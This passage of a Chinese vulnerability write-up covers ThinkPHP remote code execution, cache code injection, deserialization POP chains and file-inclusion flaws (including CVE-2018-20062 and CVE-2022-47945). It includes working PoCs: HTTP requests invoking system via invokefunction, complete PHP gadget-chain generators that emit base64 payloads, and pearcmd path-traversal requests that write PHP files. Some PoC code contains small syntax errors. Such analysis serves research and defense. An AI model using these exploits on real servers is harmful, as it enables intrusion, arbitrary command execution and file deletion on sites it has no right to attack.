  这种方式对路由处理总体流程不变，也是通过动态函数调用Request::__construct循环变量覆盖，但触发函数的方式就不同了。

  ![img](https://cdn.nlark.com/yuque/0/2022/png/21861937/1650857922321-4fef7227-93c0-4add-975a-4cf4a2202aae.png)

  默认按照混合路由模式下Request::routeCheck直接return $result（代码逻辑截图看方式一的路由处理截图），这里没有触发函数调用的条件。因此回到上层的App::run，跟进后续代码中判断是否开启debug模式，在debug分支有调用Request::param：

  ![img](https://cdn.nlark.com/yuque/0/2022/png/21861937/1650857527027-b189aa88-24b3-40b2-b344-1fbd0038e226.png)

  对该处调用分析发现外部可控属性：$this->param来源于$this->get和$this->route，这俩属性对应同名的方法获取外部数据。$filter不变，仍然可控。

  - **方式三：混合路由访问第三方库**

  路由处理方式也不变，触发调用可执行函数的filterValue通过不同于前面两种情况的路由访问方式完成：

  ![img](https://cdn.nlark.com/yuque/0/2022/png/21861937/1650874972779-db550601-3abd-49ef-a30f-cea038961670.png)

  $dispatch['method']意味着默认url_route_on开启，$result=method。$dispatch['method']调度方式就直接调用Request::param()方法，可触发filterValue（）。框架默认为module方式，要想用该方式适用于第三方库或自己写的app中进行手动添加或配置支持该情况路由的情况。

  > 官方手册说明了[路由注册](https://www.kancloud.cn/manual/thinkphp5/118030)的方式和规则，这种场景在于单独给某个模块或者页面配置自己的路由。

  完整版中think-captcha库默认安装，配置了method方式路由访问。

#### -漏洞复现

- 方式一的PoC模板

```
_method=__construct大小写[&method=*any*]&server[REQUEST_METHOD]=指定命令&filter[\[\]]=指定代码执行函数
```

- 方式二的PoC模板

```
_method=__construct大小写[&method=any&server.*=any]&[get|route][\[\]]=指定命令&filter[\[\]]=指定代码执行函数
```

- 方式三的PoC模板（针对think-captcha库）

```
POST /index.php?s=captcha HTTP 1.1/
Host: x.x.x.x

_method=__construct大小写&method=get[&server.*=any]&[get|route][\[\]]=指定命令&filter[\[\]]=指定代码执行函数
```

由于注册的路由规则`'captcha/[:id]'`等同于`captcha/captcha函数/函数参数`，id这里原指的是传入的参数。两者之间前者响应500，后者响应200，但是命令都会执行成功，具体差异跟进路由处理的代码即可，不做说明了。

### 3. 【CVE-2018-20062】路由未过滤处理控制器+App::invokemethod反射可调用任意类

#### - 利用条件

1. 版本范围：ThinkPHP [5.0.0, 5.0.23], ThinkPHP [5.1.0, 5.1.30]
2. 默认开启url_route_on配置（混合模式）

#### - 漏洞原理和分析

> 代码展示版本tp5.1.19

![img](https://cdn.nlark.com/yuque/0/2022/png/21861937/1651051956761-0d7d182a-0762-437e-b23b-bcb3980672e0.png)

tp5.*混合模式下路由解析的时候通过'/|'符号对路由进行拆分，划分$module、$controller和$action，其中$controller和$action没有限制调用域，从而可以跨作用域调用任意指定的类和方法。App::exec()或Module::exec()通过反射`Reflect::invokeArgs`完成调用。

详细分析参考https://xz.aliyun.com/t/3570#toc-4

#### -漏洞复现

常见的一个PoC长成这样：

```http
GET /public/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id HTTP/1.1
Host: x.x.x.x
```

从代码层次上的绕过还有哪些？

- **绕过点1：路由处理过程中路由的分隔符**

路由分隔符'/'可被替换为'|'，Route::check调用$request->method有将'|'还原'/'。

`index|\think\app|invokefunction`

'/'和'|'还可以混合使用：

`index|\think\app/invokefunction`

- **绕过点2：结合index处理**

因为Request::pathinfo中ltrim('/')会去除'/进行分段(等同于'|'也可以)；上层Request::path中ltrim($suffix, '.') 去除点号，可以配合省略index。e.g.  `.|\think\app|invokefunction`

- **绕过点3：命名空间规则**

指定类的命名空间开头'\'可以省略

此外，本rce漏洞点不在Request类调用上，区别在可以通过路由解析任意指定php类从而从外部执行指定的php函数或方法。漏洞核心就是路由解析中未过滤controller导致后续反射机制可调用任意类，因此可以从这点出发造成不同的影响从而绕过。但类的调用有public/private/protected属性限制还有php版本限制等等，在不同的tp版本下payload不一定起效，版本之间有差异化。

可以查看抹茶师傅测试的[目前可调用的php类](https://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP5/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C9.md#:~:text=%E4%B9%9F%E4%B8%8D%E5%B0%BD%E7%9B%B8%E5%90%8C%E3%80%82-,%E5%85%B7%E4%BD%93%E5%A6%82%E4%B8%8B,-%EF%BC%9A)。

### 4.Cache::set 缓存设置代码注入

> CNVD-2017-22082

#### - 利用条件

1. 版本范围：ThinkPHP [3.2.3, 3.2.5]，ThinkPHP [5.0.0,5.0.10]
2. `Cache::set("xxx",$value)`设置缓存的方法`$value`值可控，`“xxx”`为缓存名。如果使用助手函数`S()`或内置函数`cache()`也是同样的效果
3. 缓存文件的目录可Web访问。

#### - 漏洞原理和分析

[tp对缓存默认处理方式是以文件方式存储](https://www.kancloud.cn/manual/thinkphp5/118131)，因此默认使用的驱动是`think\cache\driver\File`，即cache方法的type选项默认是file类处理缓存。

- thinkphp3

ThinkPHP\Mode\Api\functions.php的S函数获取输入的缓存；

ThinkPHP\Library\Think\Cache.class.php的getInstance获取实际缓存实例：File类；

ThinkPHP\Library\Think\Cache\Driver\File.class.php的set创建缓存文件，并直接将缓存写入文件。

- thinkphp5

thinkphp/library/think/Cache.php的set方法获取缓存；

thinkphp/library/think/cache/driver/File.php的set方法创建缓存文件，并直接将缓存写入文件。

具体分析可参考[Thinkphp3.2.3-5.0.10缓存漏洞](https://h3art3ars.github.io/2019/12/16/Thinkphp3-2-3-5-0-10缓存漏洞/)

#### -漏洞复现

- demo构造

该漏洞入口需要有模块调用缓存管理的S函数才能触发，这里在默认Home模块下创建以下内容的控制器内容进行模拟：

```php
//thinkphp 3.x
class IndexController extends Controller
{
    public function cache()
    {
        $cache = I('post.cache');
        S('name', $cache);
        echo 'hello';
    }
}
//thinkphp 5
public function index()
    {
        Cache::set("name",input("get.username"));
        return 'Cache success';
    }
```

- PoC

  Thinkphp3和thinkphp5的PoC差不多，这里简单给出tp5的：

```http
GET /public/index.php/Index/index/codeinject?username=hello%0d%0a@eval(phpinfo());//%20%EF%BC%8C HTTP/1.1
Host: x.x.x.x
```

该漏洞重点在于查找缓存常见的名字，比如key和name；再利用的时候注意默认的session文件写入路径，如：

```
xxx/Application/Runtime/Temp/b068931cc450442b63f5b3d276ea4297.php
xxxx/runtime/cache/b0/68931cc450442b63f5b3d276ea4297.php
```

缓存路径一般不在官方认可Web目录public目录下，因此写入后可能也不能直接访问。**写入路径的限制了webshell访问和利用条件，如何利用需要深入思考，这里不做解释。**

## （三）反序列化链

需要提前对[php反序列化](https://www.cnblogs.com/iamstudy/articles/php_serialize_problem.html)和[pop链条构造](https://www.cnblogs.com/iamstudy/articles/php_object_injection_pop_chain.html)有基础了解。

### 1. think\process\pipes\Windows:__destruct任意文件删除

#### - 利用条件

版本范围：ThinkPHP 5.0.X/ThinkPHP 5.1.X

#### - 漏洞原理和分析

1. 入口：`think\process\pipes\Windows:__destruct`方法调用的`removeFiles`方法造成任意文件删除.
2. `file_exists`分支下存在`unlink`函数可造成任意删除文件效果

详细分析参考：[ThinkPHP5.0.X反序列化利用链](https://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP5/ThinkPHP5.0.X反序列化利用链.md)。这个反序列化是最简单形式的了，后续几条chains都是很多通过这个衍生出来的。

漏洞利用链图示如下：

![img](https://cdn.nlark.com/yuque/0/2023/png/21861937/1678793580634-37a47a46-234d-4de0-a35d-5fe429774cbe.png)

#### -漏洞复现

- demo构造

选取最简单的unserialize函数触发

```php
<?php
namespace app\index\controller;

class Index
{
    public function index()
    {
        $c = unserialize($_GET['c']);
        var_dump($c);
        return 'Welcome to thinkphp5.0.24';
    }
}
```

- PoC

```php
<?php
namespace think\process\pipes;

//step3: 查看Pips发现是虚类，因此只用写出即可
class Pips {}

//Pips和Windows的命名空间一样，写一个即可
//namespace think\process\pipes;

// step2: 继承了Pips，需要引用
class Windows extends Pips {
  private file = [] //step2.1 源代码$this->file，写poc的时候就是私有属性
  // step2.2 file在源代码__construct就赋值，因此这里同步写就行了（包括函数访问域）
  public function __construct(){ 
    $this->file = ['FILE PATH'];
  }
}
//step1: generate exp
echo serialize();
echo PHP_EOL; //换行
echo base64_encode();
```

编写思路：

1. 【step1】固定写出生成exp的php代码
2. 【step2和step3】再写反序列化的大致流程：写出整个反序列化设计到的所有类，先写实类再写虚类，同命名空间下可合并在一起写。实类之间按照反序列化出发顺序去写。
3. 【step2.1和step2.2】然后在目标调用的属性和方法去不同的类里设置他们的目标值，其属性、作用域和调用顺序遵循源代码设定。

### 2. think\process\pipes\Windows+think\Model\Pivot+Request::input RCE

#### - 利用条件

版本范围：ThinkPHP 5.0.X/ThinkPHP 5.1.X

#### - 漏洞原理和分析

1. 入口： `think\process\pipes\Windows:__destruct`方法调用的`removeFiles`方法造成任意文件删除.
2. `file_exists`可触发任意类的`__toString`方法，需要`file_exists($filename)`的$filename可控且设为一个对象。（**因为**`**file_exists**`**函数需要的是一个字符串类型的参数，如果传入一个对象，就会先调用该类**`**__toString**`**方法，将其转换成字符串，然后在返回上层进行后续代码逻辑。**）
3. `think\model\concern\Conversion`的`__toString`实际调用`toArray`，这里寻找函数调用的地方发现`$relation->visible($name)`，意图通过`__call`方法触发，刚好`Reuqest`类没有visible方法且设置了__call方法
4. 结合`Request::input`RCE利用链，寻找调用了该方法的地方完成利用链，比如`param`方法。

详细漏洞分析查看[ThinkPHP5.1.X反序列化利用链](https://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP5/ThinkPHP5.1.X%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE.md)

漏洞利用链条承接上一个任意文件删除反序列化漏洞图示之后开始：

![img](https://cdn.nlark.com/yuque/0/2023/png/21861937/1678793796595-50cce937-539f-4b43-b86b-7ae63bfc599c.png)

#### -漏洞PoC

```php
<?php
/*step4 __toString可控的参数找到的地方是trait，完成实例化对象相关特性*/
namespace think\model\concern;
trait Conversion{
    protected $append;
}
trait Attribute {
    private $data;
}

/*step5 完成实例化对象相关实类*/
namespace think;
abstract class Model{
    use model\concern\Conversion;
    use model\concern\Attribute;
}

/*step6 完成目的接入rce的利用链条*/
class Request {
    /*step7 内部属性主要定位命令点是什么属性，进入rce分支是什么属性，执行命令代码的是什么属性*/
    protected $hook = [];
    protected $filter;
    //array_walk_recursive($data, [$this, 'filterValue'], $filter);
    protected $param = ['id']; //设执行的命令等同于$data,进入if(is_array($data)]

    // original setting false
    //protected $mergeParam = false;

    protected $config = [];
    // param($name..)为空，input($name,...),$name字符串格式化后为空字符串不会对进行$name转$data处理
    // 实际逻辑发现进入if分支也没事，默认配置_ajax不影响

    public function __construct()
    {
        $this->hook = ['visible' => [$this, 'isAjax']];
        //call_user_func_array([$this, 'isAjax'], ['任意值']) $args没用了
        $this->filter = 'system';
        //call_user_func(filter,)
    }
}

/*step3 调用的实类实例化对象，通过对象设置属性作为可控参数，传入执行的命令和命令代码*/
namespace think\model;
use think\Model;
use think\Request;

class Pivot extends Model{
    public function __construct()
    {
       $this->append = ['hello' => ['任意值']]; //$name params?
       $this->data = ['hello' => new Request()]; // obj
    }
}

/*step2 反序列化开始*/
namespace think\process\pipes;
use think\model\Pivot;

abstract class Pipes{}
class Windows extends Pipes {
    private $files = [];
    public function __construct()
    {
        $this->files = new Pivot(); // obj
    }

}

/*step1*/
echo serialize(new Windows());
echo PHP_EOL;
echo base64_encode(serialize(new Windows()));
```

### 3.think\process\pipes\Windows:__destruct+think\Model\Pivot+动态调用RCE

#### - 利用条件

版本范围：ThinkPHP 5.2.X 

#### - 漏洞原理和分析

1. 入口： `think\process\pipes\Windows:__destruct`方法调用的`removeFiles`方法造成任意文件删除.
2. `file_exists`可触发任意类的`__toString`方法，需要`file_exists($filename)`的$filename可控且设为一个对象。
3. 【pop chains】`think\model\concern\Conversion::toArray`情况不变，用实类`think\model\Privot`。`Conversion::getAttr`方法处理参数的流程出现动态函数调用的情况，具体过程如下：

![img](https://cdn.nlark.com/yuque/0/2023/png/21861937/1678798949954-96a6fd0a-a42b-46f9-a641-a72558ccd7b0.png)

详细漏洞分析查看[ThinkPHP5.2.X反序列化利用链](https://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP5/ThinkPHP5.2.X%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE.md)

> 上个反序列化链条前三步在5.2.x也可以用，但是Request::input rce链条已经被修复了，所以需要重拼接，这里替换成通过匿名函数形式完成动态函数调用，达到RCE。

为了方便后续poc编写，这里分析展示`think\model\concern\Attribute`的相关代码:

```php
public function getAttr(string $name)
    {
        try {
            $relation = false;
            $value    = $this->getData($name);
          //getData('hello'), $value=$this->data[hello]/$this->relation[hello]
        } catch (InvalidArgumentException $e) {
            $relation = true;
            $value    = null;
        }

        return $this->getValue($name, $value, $relation);
      //name=hello,value=$this->data[hello]/$this->relation[hello], $relation=false
    }

public function getData(string $name = null)
    {
        if (is_null($name)) {
            return $this->data;
        }

        $fieldName = $this->getRealFieldName($name);//key=name=hello

        if (array_key_exists($fieldName, $this->data)) {
          //$this->data[hello]
          //这里等同于array_key_exists($name, $this->data)
            return $this->data[$fieldName];
        } elseif (array_key_exists($name, $this->relation)) {//默认感觉也可以的
            //$this->relation[hello]
            return $this->relation[$name];
        }
......
      
protected function getRealFieldName($name)
    {
        return $this->strict ? $name : App::parseName($name);//$strick = true默认
    }
      
protected function getValue(string $name, $value, bool $relation = false)
    {
        //name=hello,value=$this->data[hello]/$this->relation[hello], $relation=false
        // 检测属性获取器
        $fieldName = $this->getRealFieldName($name);//$this->withAttr[hello]
        $method    = 'get' . App::parseName($name, 1) . 'Attr';

        if (isset($this->withAttr[$fieldName])) {//$this->withAttr[hello]=system
            if ($relation) {
                $value = $this->getRelationValue($name);
            }//默认false

            $closure = $this->withAttr[$fieldName];
            $value   = $closure($value, $this->data);//动态函数调用
            //system('id',$this->data);                                     
      ......
```

这里设定一个自定义值，开始跟进写poc或者跟着动调写，poc设定的是第一种用system执行命令的利用方式。

#### -漏洞PoC

- `system(string $command [, int &$return_var])`方式

这种方式只能用system执行命令，其他的会收到第二个参数的影响。[phpggc针对这种方式有写poc，思路多创建了一个get方法。](https://github.com/ambionics/phpggc/blob/master/gadgetchains/ThinkPHP/RCE/1/gadgets.php)

```php
<?php
/*step5*/
namespace think\model\concern;
trait Conversion{
    protected $append = [];

}
trait Attribute{
    private $withAttr = [];
    private $data = [];
}

/*step4*/
namespace think;
abstract class Model{
    use model\concern\Conversion;
    use model\concern\Attribute;
}

/*step3*/
namespace think\model;
use think\Model;

class Pivot extends Model{
    public function __construct() {
      /*step6 跟进分析的代码自定义设值方便poc编写*/ 
        $this->append = ['hello'=>'a'];
        $this->data = ['hello' => 'id'];
        $this->withAttr = ['hello'=> 'system'];
    }
}

/*step2*/
namespace think\process\pipes;
use think\model\Pivot;

abstract class Pipes{}
class Windows extends Pipes{
    private $files = [];
    public function __construct(){
        $this->files = new Pivot();
    }
}

/*step1*/
echo serialize(new Windows());
echo PHP_EOL;
echo PHP_EOL;
echo base64_encode(serialize(new Windows()));

```

- 闭包函数/匿名函数

\Opis\Closure是thinkphp自带的函数，是可用于序列化匿名函数，使得匿名函数同样可以进行序列化操作。其中在\__invoke()中有call_user_func函数，并且`call_user_func_array($this->closure, func_get_args());`。

序列化一个匿名函数，然后利用`$closure($value, $this->data)触发SerializableClosure.php的__invoke，从而导致call_user_func执行我们自定义的匿名函数达到RCE效果。

```php
<?php

namespace think\model\concern;
trait Attribute{
    private $data = [];
    private $withAttr = [];
}
trait Conversion{
    private $append = [];
}
trait RelationShip{
    private $relation = [];
}

namespace think;

abstract class Model{
    use model\concern\Attribute;
    use model\concern\Conversion;
    use model\concern\RealtionShip;
}

namespace think\model;
require __DIR__.'/vendor/autoload.php';
use Opis\Closure\SerializableClosure;//引入tp框架自带的闭包函数序列化类

class Pivot extends Model{
    public function __construct(){
        $this->append = ['hello' => '1'];
        $this->withAttr = ['hello' => new SerializableClosure(function(){phpinfo();})];
        //源代码想实现闭包函数，由此灵感：写一个闭包函数，但需要触发这个闭包函数可以通过SerializableClosure序列化后在传入的时候触发invoke就能执行闭包函数
        $this->data = ['hello' => ''];
    }
}

namespace think\process\Pipes;
use think\model\Pivot;

abstract class Pipes{}
class Windows extends Pipes{
    private $files = [];
    public function __construct(){
        $this->files = new Pivot();
    }
}

echo serialize(new Windows());
echo PHP_EOL;
echo base64_encode(serialize(new Windows()));
```

- 找到一个新的`__call`类

`think\Db`的`__call`方法存在可控参数能实例化任意类，可用性比较大：

```php
public function __call($method, $args)
    {
        $class = $this->config['query'];

        $query = new $class($this->connection);

        return call_user_func_array([$query, $method], $args);
    }
```

配合`think\Url`中存在的可目录穿越的任意route.php进行文件包含，但需要提前上传该文件。此处不放poc了，写法只是替换了Request::input部分。

```php
///src/think/Url.php
public function __construct(App $app, array $config = [])
    {
        $this->app    = $app;
        $this->config = $config;

        if (is_file($app->getRuntimePath() . 'route.php')) {//可控
            // 读取路由映射文件
            $app->route->setName(include $app->getRuntimePath() . 'route.php');
        }
    }

///src/think/App.php
public function getRuntimePath(): string
    {
        return $this->runtimePath;//可控
    }
```

### 4.think\Model\Pivot字符串拼接+动态调用RCE

#### - 利用条件

版本范围：ThinkPHP v6.0.1+

#### - 漏洞原理和分析

1. tp6使用Model类自带的destruct触发反序列化替换被过滤的`think\process\pipes\Windows`，移除后触发反序列化链条没有了。但是找到Model.php存在`__destruct`并且由于`__toString`导致的反序列化链条存在，继承Model的实类选用`think\model\Pivot`，整体流程：

![img](https://cdn.nlark.com/yuque/0/2023/png/21861937/1678937668370-5e478528-77bf-45f1-8e7f-5dade0354834.png)

2. `__toString`方法出发后的利用链还是动态调用的方式。

详细可以查看[【Mochazz】ThinkPHP6.X反序列化利用链](https://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP6/ThinkPHP6.X反序列化利用链.md)和[thinkphp v6.0.x 反序列化利用链挖掘](https://www.anquanke.com/post/id/187393#h3-4)（注意：此文作者说的phpggc ThinkPHP/RCE2 版本是5.0.24，不是本处的6.x版本，前期调用链条还是用的`think\process\pipes\Windows`的）

#### -漏洞复现

```php
<?php

namespace think\model\concern;
trait Attribute{
    protected $filed = [];
    protected $schema = [];
    private $data = [];
    private $withAttr = [];
}
trait Conversion{
    protected $visible = [];
}
trait ModelEvent{
    protected $withEvent = true;
}

namespace think;
use Opis\Closure\SerializableClosure;
abstract class Model{
    use model\concern\Attribute;
    use model\concern\Conversion;
    use model\concern\ModelEvent;

    private $force = false;
    private $lazySave = false;
    private $exists = false;
    protected $table;
    protected $suffix;
}

namespace think\model;
use Think\Model;

class Pivot extends Model{
    public function __construct()
    {
        $this->force = true;
        $this->withEvent = false;
        $this->table = 'hello';
        $this->suffix = 'world';
        $this->lazySave = true;
        $this->exists = true;
        $this->data = ['hello'=>''];
        $this->visible = ['hello'=>''];
        $this->withAttr = ['hello' => new SerializableClosure(function(){phpinfo();})];
    }
}

echo serialize(new Pivot());
echo PHP_EOL;
echo PHP_EOL;
echo base64_encode(serialize(new Pivot()));
```

### 5. 其他相关反序列化

php反序列化主要操控的地方就是在反序列化发生前和发生后的两个阶段。再加上thinkphp上述几个反序列化链，可以总结出来反序列化几个入口：

- 直接反序列化unserialize触发
- 特殊可触发构造函数流程的函数：文件操作中的file_exists
- 特殊数据类型：session、phar文件

第三种需要结合特定的场景下进行触发，虽然在上述的thinkphp入口没有构建类似的情况，但是tp初始化session的时候如果可控的话就存在这种风险。同时上传文件的地方如果没有限制phar文件，同时又支持phar文件解析，那么也会有类似的问题。因为这两种文件和数据类型，都在识别和处理的时候本身序列化了自身，因此后续才会有对应的反序列化过程。

上面分析的pop chains，从第一条链根据不同的需求变形了很多次，在thinkphp6中`CVE-2021-36564`、`CVE-2021-36567`、
`CVE-2022-38352`也是根据上述的链条继续替换利用链和调用链。这三个CVE中都利用了第三方库`\league\flysystem`构建漏洞利用

链，影响范围受限，但由于composer安装的话会进行安装该库，所以该模式部署下的thinkphp应用会有安全问题。因此，在特定情况下利用这种方式的反序列化链条也是快速挖掘反序列化链的方式之一。

## （四）文件操作漏洞

### 1. View::assign() 变量覆盖+文件包含

#### - 利用条件

1. 版本范围：ThinkPHP 3.2.*, ThinkPHP  [5.0.0, 5.0.18], ThinkPHP [5.1.0, 5.1.10]
2. 通过`View::assgin()`给模板赋值的变量或变量内容可控。
3. **需要配合上传图片马或者日志文件、备份文件等，伪造正常文件，然后再请求包含。**

#### - 漏洞原理和分析

**（1）ThinkPHP 3**

1. `View::assgin`方法未对外部数据过滤赋值给`$this->tVar`
2. `Behavior\ContentReplaceBehavior::templateContentReplace`

解析模板视图标签

1. `Template::fetch`-> `Template::loadTemplate`读取自定义模板
2. `Storage::load`对模板进行变量覆盖，然后直接包含。

**（2）ThinkPHP 5**

1. `View::assgin`方法未对外部数据
2. 过滤赋值给`$this->data`
3. 模板获取变量进行渲染调用`view::fetch`方法。

`View::fetch`->`think\view\driver\Think::fetch`->`Template::fetch`

1. 通过`Template::parseTemplateFile`方法解析模板数据
2. `think\template\driver\File::read`方法通过`extract`对$vars覆盖包含了$cachefile，然后直接`include`包含

具体分析查看（tp3）https://mp.weixin.qq.com/s/_4IZe-aZ_3O2PmdQrVbpdQ和（tp5）https://mp.weixin.qq.com/s/_4IZe-aZ_3O2PmdQrVbpdQ

#### -漏洞复现

- demo构造

  tp3和tp5构造方式差不多，仅给出tp5。

  ```php
  <?php
  namespace Home\Controller;
  use Think\Controller;
  class IndexController extends Controller {
      public function index($value=''){
          $this->assign($value);
          $this->display();
      }
  }
  ```

  tp3复现构造访问入口时候不使用`display`方法，而是直接调用`fetch`方法需要加上`exit或die`，直接调用可能会因为`ob_start`方法开启了缓存区，从而不能输出代码。同时tp3需要构造和控制器相同名称的自定义模板页面，e.g.`fileinclusion.html`。

- PoC

步骤一：文件写入

PoC受到debug模式影响，但是框架版本影响区别不大，这里给出tp5的PoC。

```
开启debug模式下:
GET /index.php?m=Home&c=Index&a=index&test=--><?=phpinfo();?> HTTP/1.1
Host: x.x.x.x

不开启debug模式：
GET /index.php?m=--><?=phpinfo();?> HTTP/1.1
Host: 127.0.0.1
```

步骤二：文件包含

tp3变量覆盖的参数为$_filename，tp5变量覆盖参数为$cachefile，包含的时候PoC参数有差别：

```
thinkphp3:
GET /index.php?m=Home&c=Index&a=fileinclusion&value[_filename]=xxx.log HTTP/1.1
Host: x.x.x.x

thinkphp5:
GET /thinkphp/tp-5.0.15/public/index.php/index/index/tp5inclufile?cacheFile=/www/public/upload/20210510/xxxx.jpg HTTP/1.1
Host: x.x.x.x
```

### 2. 【CVE-2022-47945】LoadLangPack.php::switchLangSet() 多语言模式包含

#### - 利用条件

1. 版本范围：ThinkPHP v6.0.1-v6.0.13，v5.0.x，v5.1.x
2. 直接RCE需要docker部署框架，并且需要php开启pear扩展（编译的时候有`--with-pear`配置）或者直接安装pear扩展的php并开启（php7.3以前默认安装），包含该文件即可。
3. 官方手册说明开启多语言模式：[thinkphp 6.x](https://www.kancloud.cn/manual/thinkphp6_0/1037637)、[thinkphp 5.x](https://static.kancloud.cn/manual/thinkphp5/118132)

#### - 漏洞原理和分析

多语言模式下对数据包`GET["lang"] 、HEADER["think-lang"] 、COOKIE["think_lang"]`这三个地方用detect方法检测语言类型，如果不是zh-cn类型则进行语言转换，转换过程中的`switchLangSet()`方法通过判断完需要包含的文件存在后直接进行包含。

详细分析参考https://tttang.com/archive/1865/#toc__2

#### -漏洞复现

仅复现该漏洞的话参考上一节的跳跳糖链接即可，但是深入利用的话是需要配合php pear扩展的小trick的。php在5.2.*版本默认开启

`register_argc_argv`，但是在后续php版本ini配置中默认是关闭的，这个特性会导致变量覆盖的漏洞。docker环境下php则是会开启这个配置，同时pear获取web参数的时候也遵循了类似这种情况的方式。php在7.3版本之前会自动安装pear扩展，并通过pearcmd.php来执行pear相关命令。pear命令中`config-create`可以在指定文件中写入自定义文件内容，格式：`pear config-create CONTENT FILE PATH `，可利用这个方式写shell。pearcmd.php的详细利用方式可参考[p牛的文件包含trick第六节](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp)。

那么在该漏洞中可以包含pearcmd.php文件，达到RCE的效果。

步骤一：利用lang参数包含pearcmd.php进行写文件（下面两种均可，这里不写shell了，写phpinfo）

```http
GET /index.php?+config-create+/&lang=../../../../../../../../../usr/local/lib/php/pearcmd&/+/<?=phpinfo();?>+/tmp/test.php HTTP/1.1
Host: x.x.x.x
```

```http
GET /index.php?lang=../../../../../../../../../../usr/local/pear/share/pear/pearcmd&+config-create+/<?=phpinfo();?>+/tmp/test.php HTTP/1.1
Host: x.x.x.x
```

步骤二：利用lang参数包含写入的文件验证成功与否

```http
GET /index.php?lang=../../../../../../../../tmp/test HTTP/1.1
Host: x.x.x.x
```

